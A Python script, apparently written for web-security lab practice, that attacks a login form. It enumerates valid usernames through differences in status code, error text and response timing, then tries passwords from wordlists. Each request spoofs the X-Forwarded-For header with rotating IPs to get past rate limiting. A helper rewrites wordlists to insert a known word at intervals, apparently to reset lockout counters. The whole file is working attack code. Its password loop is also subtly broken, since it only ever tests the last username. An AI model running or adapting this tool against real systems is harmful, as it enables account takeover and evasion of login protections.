import requests
import sys

from io import BytesIO
from lxml import etree

TARGET = ''
TIMEOUT = 10
USERS_LIST = 'authentication/wordlists/usernames.txt'
PASSWORD_LIST = 'authentication/wordlists/passwords.txt'
USER_INPUT_NAME = 'username'
PASSWORD_INPUT_NAME = 'password'
SEARCH_TERM = 'Invalid username or password.'
WORDLIST = 'authentication/wordlists/test.txt'
WORD = 'peter'
AFTER_EVERY = 4

def enumerate_usernames(target, users_list, user_input_name, password_input_name, search_term, timeout=10):
    session = requests.Session()
    response = session.get(target, timeout=timeout)
    params = get_params(response.content)
    usernames = list()

    try:
        with open(users_list, 'r') as users:
            for user in users:
                usernames.append(user.strip())
    except FileNotFoundError:
        sys.exit('The file was not found')
    except Exception as e:
        sys.exit(f'An error occurred: {e}')

    params[user_input_name] = 'username'
    params[password_input_name] = 'password'
    failed_response = session.post(target, params, timeout=timeout)
    potential_usernames = list()
    usernames_times = list()
    octet = 1

    for username in usernames:
        params[user_input_name] = username
        params[password_input_name] = 'password123456789!@#$%&_+9876543210'

        test_response = session.post(target, params, headers={'X-Forwarded-For': '192.54.215.' + str(octet)}, timeout=timeout)
        usernames_times.append((username, test_response.elapsed.total_seconds() * 1000))
        octet += 1

        if test_response.status_code != failed_response.status_code:
            potential_usernames.append(username)
            print(f'Possible username identifed: {username}')
            print(f'Regular failed login status code: {failed_response.status_code}')
            print(f'Login with username {username} status code: {test_response.status_code}')
        elif not search_tree(test_response.content, search_term):
            potential_usernames.append(username)
            print(f'Possible username identified: {username}')
            print(f'Text on failed login not present for {username}')
        else:
            print(f'No variance for username: {username}')

    usernames_times.sort(key=lambda usr_time: usr_time[1], reverse=True)

    for i in range(1,len(usernames_times)):
        if (usernames_times[i - 1][1] - usernames_times[i][1]) >= 30:
            for n in range(i, 0, -1):
                potential_usernames.append(usernames_times[n - 1][0])
                print(f'Large time-based difference for username: {usernames_times[n - 1][0]}')
        break
    
    print('\nPotential Usernames:')
    
    for potential_username in potential_usernames:
        print(potential_username)

    return potential_usernames

def enumerate_password(target, usernames, pwd_list, user_input_name, password_input_name, search_term, timeout=10):
    passwords = list()

    try:
        with open(pwd_list, 'r') as pwds:
            for pwd in pwds:
                passwords.append(pwd.strip())
    except FileNotFoundError:
        sys.exit('The file was not found')
    except Exception as e:
        sys.exit(f'An error occurred: {e}')

    session = requests.Session()
    response = session.get(target, timeout=timeout)
    data = get_params(response.content)

    data[user_input_name] = usernames[0]
    data[password_input_name] = 'password'
    failed_response = session.post(target, data, timeout=timeout)
    potential_credentials = list()
    octet = 1

    for password in passwords:
        data[password_input_name] = password

        for username in usernames:
            data[user_input_name] = username

        test_response = session.post(target, data, headers={'X-Forwarded-For': '192.54.215.' + str(octet)}, timeout=timeout)
        octet += 1

        if test_response.status_code != failed_response.status_code:
            potential_credentials.append({'user': username, 'pwd': password})
            print(f'Possible credentials identifed: user: {username} pwd: {password}')
            print(f'Regular failed login status code: {failed_response.status_code}')
            print(f'Login with username {username} and password {password} status code: {test_response.status_code}')
            session = requests.Session()
            session.get(target)
        elif not search_tree(test_response.content, search_term):
            potential_credentials.append({'user': username, 'pwd': password})
            print(f'Possible credentials identifed: user: {username} pwd: {password}')
            print(f'Text on failed login not present for {username} and password {password}')
            #session = requests.Session()
            #session.get(target)
        else:
            print(f'No variance for username: {username} and password: {password}')

    print('\nPotential Credentials')

    for potential_credential in potential_credentials:
        print(f'username: {potential_credential['user']} password: {potential_credential['pwd']}')
    
    return potential_credentials
    
def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)

    for input_elem in tree.findall('.//input'):
        name = input_elem.get('name')

        if name is not None:
            params[name] = input_elem.get('value', None)
    
    return params

def search_tree(content, term):
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)

    return tree.xpath(f'.//*[text()=\'{term}\']')

def modify_wordlist(wordlist, word, insert_every=0):
    words = list()
    word += '\n'

    try:
        with open(wordlist, 'r') as wl:
            words = wl.readlines()

        count = 0
        required_words = len(words) + (len(words) // (insert_every - 1))
        print(required_words)
        words.insert(0, word)

        for index in range(1, required_words):
            if index % insert_every == 0:
                words.insert(index, word)
                count += 1

        print(f'The word was inserted {count} times at every {insert_every} occurance.')
        print(f'There is now a total of {len(words)} words.')
    except FileNotFoundError:
        sys.exit('The file was not found')
    except Exception as e:
        sys.exit(f'An error occurred: {e}')

    try:
        with open(wordlist, 'w') as wl:
            words = wl.writelines(words)

        print(f'The new list was successfully saved to {wordlist} file.')
    except Exception as e:
            sys.exit(f'An error occurred: {e}')
            

if __name__ == '__main__':
    modify_wordlist(WORDLIST, WORD, AFTER_EVERY)
    #enumerate_usernames(TARGET, USERS_LIST, USER_INPUT_NAME, PASSWORD_INPUT_NAME, SEARCH_TERM, TIMEOUT)
    '''enumerate_password(
        TARGET,
        enumerate_usernames(TARGET, USERS_LIST, USER_INPUT_NAME, PASSWORD_INPUT_NAME, SEARCH_TERM, TIMEOUT),
        PASSWORD_LIST,
        USER_INPUT_NAME,
        PASSWORD_INPUT_NAME,
        SEARCH_TERM,
        TIMEOUT
    )'''